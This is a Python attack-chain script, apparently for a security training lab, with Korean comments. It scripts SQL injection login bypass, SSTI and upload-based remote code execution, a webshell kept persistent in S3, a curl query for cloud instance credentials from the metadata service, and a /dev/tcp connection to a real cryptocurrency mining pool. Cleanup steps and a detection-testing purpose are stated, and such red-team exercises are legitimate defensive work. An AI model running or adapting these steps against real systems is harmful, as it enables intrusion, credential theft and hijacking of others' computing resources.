"""
SQLi 인증우회 → SSTI/업로드 RCE → 웹셸 지속성 → 리소스 하이재킹.

  1. T1190      SQLi 인증 우회로 세션 탈취 (비밀번호 불필요)
  2. T1059      EJS SSTI + 업로드→실행 두 경로로 코드 실행
  3. T1505.003  S3 에 남는 업로드 파일을 재호출하는 stateless 웹셸
  4. 피벗       웹셸에서 IMDS 질의 — 임시 자격증명 획득 가능성만 로깅
  5. T1496      마이닝풀 DNS/TCP 연결 + 짧은 CPU 스핀

파괴 동작이 없어 전 단계를 플래그 없이 실행한다. S3 업로드 객체만 남고,
그 key 는 recovery/webshell_keys.json 에 기록한다.

5단계는 XMRig 같은 바이너리를 내려받지 않는다. DNS 해석 + 3초 TCP connect +
CPU 스핀(상한 5초)뿐이다. 다만 아래 둘은 의도된 결과다.
  · GuardDuty CryptoCurrency 파인딩 발생 (pool.supportxmr.com 이 목록에 있음)
  · 실존 마이닝풀로 3초간 실제 연결 시도

실행:
    python scenario2.py
    python scenario2.py --via ssti        # RCE 경로 고정 (os/ssti/upload)
    python scenario2.py --mine-seconds 0  # CPU 스핀 생략
"""

from __future__ import annotations

import argparse
import datetime as dt
import json
import sys
import uuid
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

import common
from common import WhsClient, banner

LOG = None

MINING_POOL_HOST = "pool.supportxmr.com"
MINING_POOL_PORT = 3333


# ─────────────────────────────────────────────────────────────
# 1. SQLi 인증 우회 (T1190)
# ─────────────────────────────────────────────────────────────
def step1_sqli_login(c: WhsClient) -> dict:
    banner(LOG, "STEP 1 — SQLi 인증 우회(T1190)")
    user = c.login_sqli(common.env("SQLI_PAYLOAD", "' OR '1'='1' -- "))
    LOG.info("  [+] 비밀번호 없이 세션 확보 — 첫 사용자 행으로 로그인됨")
    return user


# ─────────────────────────────────────────────────────────────
# 2. RCE — SSTI + 업로드→실행 (T1059)
# ─────────────────────────────────────────────────────────────
def step2_rce(c: WhsClient, via: str) -> None:
    banner(LOG, "STEP 2 — RCE: EJS SSTI + 업로드→실행(T1059)")

    LOG.info("  [SSTI] 실행 컨텍스트 확인 (대상 %s 고정)", c.target_host)
    for cmd in ("id", "hostname", "uname -sr"):
        out = c.on_target(cmd, via="ssti", label=f"ssti {cmd}")
        LOG.info("    ssti %-10s → %s", cmd, out.replace("\n", " | "))

    LOG.info("  [UPLOAD] 업로드→실행 경로 RCE (payloads/probe.sh)")
    key = c.upload_payload("probe.sh", TARGET=c.short_host())
    out = c.run_payload_on_target(key, label="probe.sh", expect="uid=")
    LOG.info("    probe.sh 실행 결과 → %s", out.replace("\n", " | "))


# ─────────────────────────────────────────────────────────────
# 3. 웹셸 지속성 (T1505.003)
# ─────────────────────────────────────────────────────────────
def step3_persistence(c: WhsClient) -> str:
    """
    업로드한 스크립트가 S3 에 상주하는 것 자체가 지속성이다.

    재호출은 고정된 1대에서만 일어난다. ALB 가 다른 인스턴스로 보내면
    persist.sh 의 @@TARGET@@ 가드가 빠져나가고 run_payload_on_target 이 재시도한다.
    """
    banner(LOG, "STEP 3 — 웹셸 지속성(T1505.003)")
    run_id = uuid.uuid4().hex[:12]
    marker = common.env("PERSIST_MARKER", "whs-scenario2-webshell")

    key = c.upload_payload("persist.sh", MARKER=marker, RUN_ID=run_id,
                           TARGET=c.short_host())
    LOG.info("  [+] 웹셸 S3 상주 key=%s", key)
    LOG.info("      → execute(key) 로 재호출 = stateless 웹셸 (대상 %s 한정)", c.target_host)

    out = c.run_payload_on_target(key, label="웹셸 재호출", expect="marker=")
    LOG.info("  [+] %s 에서 재호출 성공: %s", c.target_host, out.replace("\n", " | "))
    LOG.info("  [=] 대상 1대에서 웹셸 재호출 확인 — 지속성 확보")

    # 사후 정리용 기록 (S3 객체를 지워야 지속성이 제거된다)
    common.save_recovery(
        HERE, "webshell_keys.json",
        json.dumps({"run_id": run_id, "marker": marker, "s3_key": key,
                    "target_host": c.target_host,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "cleanup": f"aws s3 rm s3://<bucket>/{key}"},
                   indent=2, ensure_ascii=False).encode())
    LOG.info("      정리용 key 기록: recovery/webshell_keys.json")
    return key


# ─────────────────────────────────────────────────────────────
# 4. (점선) IMDS 피벗 가능성 (T1552.005)
# ─────────────────────────────────────────────────────────────
def step4_imds_pivot(c: WhsClient, via: str) -> None:
    banner(LOG, "STEP 4 — (점선) 웹셸 셸 → IMDS 임시 자격증명 피벗 가능성")
    out = c.on_target(
        "curl -s --max-time 3 "
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        via=via, label="IMDS 피벗",
    ).strip()
    # 여기서 막히는 것(IMDSv2 required 등)은 정상적인 결과이므로 중단하지 않는다.
    if out and "denied" not in out.lower() and "{" not in out:
        LOG.info("  [+] 웹셸 셸에서 IMDS 도달 — role=%s", out.splitlines()[0].strip())
        LOG.info("      → security-credentials/<role> 로 ASIA 토큰 회수 시 scenario1 로 피벗 가능")
    else:
        LOG.info("  IMDS 미도달/차단 (IMDSv2 required 등): %s", out[:120] or "(빈 응답)")


# ─────────────────────────────────────────────────────────────
# 5. 리소스 하이재킹 — 마이닝 흉내 (T1496)
# ─────────────────────────────────────────────────────────────
def step5_cryptojacking(c: WhsClient, via: str, mine_seconds: int) -> None:
    banner(LOG, "STEP 5 — 리소스 하이재킹(T1496): 마이닝풀 연결 흉내")
    LOG.info("  주의: XMRig 등 바이너리는 내려받지 않음. DNS+TCP+짧은 CPU 스핀만.")

    host = common.env("MINING_POOL_HOST", MINING_POOL_HOST)
    port = common.env("MINING_POOL_PORT", str(MINING_POOL_PORT))
    wallet = common.env("MINING_WALLET", "")

    # 마이닝풀 DNS 해석 — GuardDuty CryptoCurrency 도메인 매칭 유도
    resolved = c.on_target(f"getent hosts {host} || nslookup {host}",
                           via=via, label="풀 DNS 해석").strip()
    LOG.info("  [+] 마이닝풀 DNS 해석: %s → %s", host, resolved.replace("\n", " ") or "(실패)")

    # 짧은 TCP connect — Flow Log / GuardDuty 연결 증거
    tcp = c.on_target(
        f"timeout 3 bash -c '</dev/tcp/{host}/{port} && echo TCP_OPEN' 2>&1 || echo TCP_CLOSED",
        via=via, label="풀 TCP 연결",
    ).strip()
    LOG.info("  [+] 마이닝풀 TCP connect(%s:%s): %s", host, port, tcp.replace("\n", " "))
    if wallet:
        LOG.info("  [i] (가정) 채굴 지갑=%s", common.mask(wallet, 6))

    # 아주 짧은 CPU 스핀 — 실제 채굴 아님, 부하 흔적만
    secs = max(0, min(mine_seconds, 5))
    if not secs:
        LOG.info("  [skip] CPU 스핀 생략 (--mine-seconds 0)")
        return
    LOG.info("  [+] %d초 CPU 스핀(채굴 흉내, 상한 5초)", secs)
    spin = (f"end=$(( $(date +%s) + {secs} )); c=0; "
            "while [ $(date +%s) -lt $end ]; do c=$((c+1)); done; echo spin_iters=$c")
    LOG.info("      스핀 결과: %s",
             c.on_target(spin, via=via, label="CPU 스핀").strip())


# ─────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────
def restore(bucket: str) -> None:
    """S3 에 남긴 업로드 객체를 지운다. 이게 웹셸의 실체라 지워야 지속성이 사라진다."""
    banner(LOG, "RESTORE — S3 업로드 객체 삭제")
    common.delete_uploaded_objects(LOG, HERE, bucket)


def main():
    global LOG
    ap = argparse.ArgumentParser(
        description="scenario2 — SQLi→SSTI/업로드 RCE→웹셸 지속성→리소스 하이재킹")
    ap.add_argument("--via", choices=["os", "ssti", "upload"], default="ssti",
                    help="RCE 실행 경로 (기본 ssti)")
    ap.add_argument("--mine-seconds", type=int, default=3,
                    help="5 CPU 스핀 시간(초, 상한 5). 0이면 스핀 생략")
    ap.add_argument("--restore", action="store_true",
                    help="S3 에 남은 업로드 객체(웹셸)를 삭제하고 종료")
    args = ap.parse_args()

    common.load_env(HERE)
    LOG = common.get_logger(HERE, "scenario2")
    banner(LOG, "SCENARIO 2 — SQLi → RCE → 웹셸 지속성 → 리소스 하이재킹",
           "흐름도2 (WHS 실습)")

    if args.restore:
        restore(common.need_env("UPLOAD_BUCKET"))
        banner(LOG, "SCENARIO 2 복구 종료", "로그: scenario2/scenario2.log")
        return

    # 지우지 않은 업로드 객체가 있으면 막는다. 그대로 또 돌리면 S3 에 웹셸이
    # 겹겹이 쌓이고 어느 것이 어느 실행 것인지 구분이 안 된다.
    common.require_restored(
        LOG, HERE, "python scenario2.py --restore",
        [("uploaded_objects.json", "keys", "S3 에 업로드 객체(웹셸)가 남아 있다")])

    # recovery_dir 을 주면 업로드한 S3 key 가 recovery/uploaded_objects.json 에 쌓인다.
    # --via upload 는 명령마다 임시 스크립트를 올리므로 이 기록이 없으면 정리를 못 한다.
    c = WhsClient(common.env("WEBAPP_URL", "https://whs4namu.click"), LOG,
                  recovery_dir=HERE)

    step1_sqli_login(c)

    # 인스턴스 1대를 고정한다. 이후 모든 단계가 그 한 대에서만 실행되고,
    # ALB 가 다른 곳으로 보내면 가드가 막고 재시도한다.
    c.pin_target(via=args.via)

    step2_rce(c, args.via)
    step3_persistence(c)
    step4_imds_pivot(c, args.via)
    step5_cryptojacking(c, args.via, args.mine_seconds)

    banner(LOG, "SCENARIO 2 종료", "로그: scenario2/scenario2.log")

    LOG.warning("")
    LOG.warning("[원상복구]  python scenario2.py --restore")
    LOG.warning("  S3 에 올린 업로드 객체를 지운다. 지우기 전까지는 key 만 알면")
    LOG.warning("  계속 재실행되는 웹셸로 남는다 (호스트에는 아무것도 안 남는다).")


if __name__ == "__main__":
    main()
